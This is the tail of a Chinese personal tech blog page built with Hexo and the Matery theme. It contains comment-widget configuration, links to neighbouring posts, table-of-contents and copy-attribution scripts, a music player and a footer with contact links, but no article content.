        master: ["de8a7aa53d07e6b6bceb45c64027763d"],
        friends: ["b5bd5d836c7a0091aa8473e79ed4c25e", "adb7d1cd192658a55c0ad22a3309cecf", "3ce1e6c77b4910f1871106cb30dc62b0", "cfce8dc43725cc14ffcd9fb4892d5bfc"],
        math: true,
        md: true,
        enableQQ: false,
        NoRecordIP: false,
        visitor: true,
        maxNest: 6,
        pageSize: 6,
        serverURLs: '',
        emoticonUrl: ["https://cdn.jsdelivr.net/npm/alus@latest", "https://cdn.jsdelivr.net/gh/MiniValine/qq@latest", "https://cdn.jsdelivr.net/gh/MiniValine/Bilibilis@latest", "https://cdn.jsdelivr.net/gh/MiniValine/tieba@latest", "https://cdn.jsdelivr.net/gh/MiniValine/twemoji@latest", "https://cdn.jsdelivr.net/gh/MiniValine/weibo@latest"],
    });
</script>

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2020/11/29/wang-luo-pei-zhi-zhi-da-xing-zong-he-shi-yan-2/">
                    <div class="card-image">
                        
                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="网络配置之大型综合实验2">
                        
                        <span class="card-title">网络配置之大型综合实验2</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2020-11-29
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/网络配置/" class="post-category">
                                    网络配置
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/网络实验/">
                        <span class="chip bg-color">网络实验</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2020/11/26/chang-jian-she-bei-mo-ren-mi-ma-zheng-li/">
                    <div class="card-image">
                        
                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="常见设备默认密码整理">
                        
                        <span class="card-title">常见设备默认密码整理</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2020-11-26
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/渗透测试/" class="post-category">
                                    渗透测试
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/密码/">
                        <span class="chip bg-color">密码</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>


<script>
    $('#articleContent').on('copy', function (e) {
        // IE8 or earlier browser is 'undefined'
        if (typeof window.getSelection === 'undefined') return;

        var selection = window.getSelection();
        // if the selection is short let's not annoy our users.
        if (('' + selection).length < Number.parseInt('10')) {
            return;
        }

        // create a div outside of the visible area and fill it with the selected text.
        var bodyElement = document.getElementsByTagName('body')[0];
        var newdiv = document.createElement('div');
        newdiv.style.position = 'absolute';
        newdiv.style.left = '-99999px';
        bodyElement.appendChild(newdiv);
        newdiv.appendChild(selection.getRangeAt(0).cloneContents());

        // we need a <pre> tag workaround.
        // otherwise the text inside "pre" loses all the line breaks!
        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
        }

        var url = document.location.href;
        newdiv.innerHTML += '<br />'
            + '来源: z1r0s&#39;blogs<br />'
            + '文章作者: z1r0s<br />'
            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';

        selection.selectAllChildren(newdiv);
        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
    });
</script>


<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>


<!-- 代码块折行 -->


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h1,h2, h3, h4'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h1,h2, h3, h4').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>


<script src="https://cdn.bootcss.com/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
<script>
    MathJax.Hub.Config({
        tex2jax: {inlineMath: [['$', '$'], ['\(', '\)']]}
    });
</script>



    <footer class="page-footer bg-color">
    
        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
<style>
    .aplayer .aplayer-lrc p {
        
        display: none;
        
        font-size: 12px;
        font-weight: 700;
        line-height: 16px !important;
    }

    .aplayer .aplayer-lrc p.aplayer-lrc-current {
        
        display: none;
        
        font-size: 15px;
        color: #42b983;
    }

    
    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
        left: -66px !important;
    }

    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
        left: 0px !important;
    }

    
</style>
<div class="">
    
    <div class="row">
        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
                   server="tencent"
                   type="playlist"
                   id="7173532278"
                   fixed='true'
                   autoplay='false'
                   theme='#42b983'
                   loop='all'
                   order='random'
                   preload='auto'
                   volume='0.7'
                   list-folded='true'
        >
        </meting-js>
    </div>
</div>

<script src="/libs/aplayer/APlayer.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>

    
    <div class="container row center-align" style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2020</span>
            
            <span id="year">2020</span>
            <a href="/about" target="_blank">z1r0s</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
            
            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
                class="white-color">232k</span>&nbsp;字
            
            
            
            
            
            
            <span id="busuanzi_container_site_pv">
                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
                    class="white-color"></span>&nbsp;次
            </span>
            
            
            <span id="busuanzi_container_site_uv">
                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
                    class="white-color"></span>&nbsp;人
            </span>
            
            <br>
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/z1r0s" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:2603350388@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2603350388" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 2603350388" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script src="/js/search.js"></script>
<script type="text/javascript">
$(function () {
    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

	
    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
    

</body>

</html>
